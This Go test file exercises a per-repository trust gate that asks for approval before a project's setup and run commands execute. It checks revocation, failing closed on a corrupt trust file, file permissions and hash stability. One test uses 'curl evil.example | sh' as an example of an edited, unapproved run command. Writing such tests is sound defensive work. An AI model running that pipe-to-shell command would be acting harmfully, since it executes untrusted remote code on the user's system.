package bootstrap

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// home points the trust file at a temporary directory, so a test never reads
// or writes the machine's real approvals.
func home(t *testing.T) {
	t.Helper()
	t.Setenv("HOME", t.TempDir())
	if TrustPath() == "" {
		t.Fatal("TrustPath is empty with HOME set")
	}
}

func TestTrust_ApprovalIsPerRepositoryAndPerText(t *testing.T) {
	home(t)
	repo := t.TempDir()
	other := t.TempDir()
	setup := []string{"pnpm install --frozen-lockfile"}

	if Trusted(repo, setup, "pnpm dev") {
		t.Fatal("Trusted before anything was approved")
	}
	if err := Approve(repo, setup, "pnpm dev"); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if !Trusted(repo, setup, "pnpm dev") {
		t.Error("not Trusted after Approve")
	}

	// Another repository saying the same thing is a different thing to approve:
	// the text arrived from a different set of committers.
	if Trusted(other, setup, "pnpm dev") {
		t.Error("approving one repository approved another")
	}

	// The gate covers setup and run together — gating only setup would move a
	// payload one key down.
	if Trusted(repo, setup, "curl evil.example | sh") {
		t.Error("an edited run command inherited setup's approval")
	}
	if Trusted(repo, []string{"pnpm install"}, "pnpm dev") {
		t.Error("an edited setup command stayed approved")
	}
}

// A user who approved main and then a branch that edits setup has read both,
// and switching back should not ask about text they already agreed to.
func TestTrust_KeepsEarlierApprovals(t *testing.T) {
	home(t)
	repo := t.TempDir()

	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if err := Approve(repo, []string{"make setup", "make build"}, ""); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	if !Trusted(repo, []string{"make setup"}, "") {
		t.Error("the first approval was lost")
	}
	if !Trusted(repo, []string{"make setup", "make build"}, "") {
		t.Error("the second approval was lost")
	}
	if got := Approvals(repo); len(got) != 2 {
		t.Errorf("Approvals = %d entries, want 2", len(got))
	}
	// Newest first, so `trust show` reads as a history.
	if got := Approvals(repo); len(got) == 2 && len(got[0].Setup) != 2 {
		t.Errorf("Approvals[0] = %v, want the most recent", got[0].Setup)
	}
}

// Re-approving the same text records one approval, not a growing pile of
// identical ones.
func TestTrust_ApprovingTwiceIsOneEntry(t *testing.T) {
	home(t)
	repo := t.TempDir()

	for range 3 {
		if err := Approve(repo, []string{"make setup"}, ""); err != nil {
			t.Fatalf("Approve: %v", err)
		}
	}
	if got := Approvals(repo); len(got) != 1 {
		t.Errorf("Approvals = %d entries, want 1", len(got))
	}
}

func TestTrust_Revoke(t *testing.T) {
	home(t)
	repo := t.TempDir()

	revoked, err := Revoke(repo)
	if err != nil {
		t.Fatalf("Revoke: %v", err)
	}
	if revoked {
		t.Error("Revoke reported work where nothing was approved")
	}

	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	revoked, err = Revoke(repo)
	if err != nil {
		t.Fatalf("Revoke: %v", err)
	}
	if !revoked {
		t.Error("Revoke reported nothing to do")
	}
	if Trusted(repo, []string{"make setup"}, "") {
		t.Error("still Trusted after Revoke")
	}
}

// An empty block asks for nothing, so there is nothing to gate — and nothing
// to approve either.
func TestTrust_NothingToRun(t *testing.T) {
	home(t)
	repo := t.TempDir()

	if Executable(nil, "") {
		t.Error("Executable(nil, \"\") = true")
	}
	if !Trusted(repo, nil, "") {
		t.Error("an empty block was gated")
	}
	if err := Approve(repo, nil, ""); err == nil {
		t.Error("Approve accepted an empty block")
	}
}

// Fails closed: a damaged trust file costs one prompt, where the other reading
// would run whatever the repository says.
func TestTrust_CorruptFileIsNotApproval(t *testing.T) {
	home(t)
	repo := t.TempDir()
	if err := Approve(repo, []string{"make setup"}, ""); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if err := os.WriteFile(TrustPath(), []byte("{ this is not json"), 0600); err != nil {
		t.Fatal(err)
	}

	if Trusted(repo, []string{"make setup"}, "") {
		t.Error("a corrupt trust file was read as approval")
	}
	// And it is not silently overwritten: the file holds every other
	// repository's approvals too.
	if err := Approve(repo, []string{"make setup"}, ""); err == nil {
		t.Error("Approve clobbered a trust file it could not read")
	}
}

func TestTrust_FileIsReadableAndPrivate(t *testing.T) {
	home(t)
	repo := t.TempDir()
	if err := Approve(repo, []string{"pnpm install"}, "pnpm dev"); err != nil {
		t.Fatalf("Approve: %v", err)
	}

	data, err := os.ReadFile(TrustPath())
	if err != nil {
		t.Fatalf("reading the trust file: %v", err)
	}
	// The question a user asks of this file is "what did I agree to?".
	if !strings.Contains(string(data), "pnpm install") || !strings.Contains(string(data), "pnpm dev") {
		t.Errorf("trust file does not say what was approved:\n%s", data)
	}

	info, err := os.Stat(TrustPath())
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0600 {
		t.Errorf("mode = %o, want 0600", perm)
	}
	if dir := filepath.Dir(TrustPath()); filepath.Base(dir) != ".opentree" {
		t.Errorf("trust file lives in %s, want ~/.opentree", dir)
	}
}

func TestHash_IsStableAndExact(t *testing.T) {
	setup := []string{"pnpm install", "pnpm build"}

	// Stable across processes as well as calls: a hash recorded last week has
	// to still match the config that produced it.
	if got := Hash(setup, "pnpm dev"); got != "34aafb94ea0a5475ce59f3677c26cc77ce7a1008cb885c75151fe39bd136c095" {
		t.Errorf("Hash = %q — the encoding changed, and every recorded approval with it", got)
	}
	if Hash(setup, "pnpm dev") == Hash(setup, "pnpm start") {
		t.Error("run is not part of the hash")
	}
	if Hash(setup, "") == Hash([]string{"pnpm install", "pnpm  build"}, "") {
		t.Error("whitespace inside a command was normalised away")
	}
	// A separator-joined encoding would confuse these two.
	if Hash([]string{"a\nb"}, "") == Hash([]string{"a", "b"}, "") {
		t.Error("two commands hash the same as one containing a newline")
	}
	if Hash(nil, "") != Hash([]string{}, "") {
		t.Error("nil and empty disagree — an absent list is an empty one")
	}
}
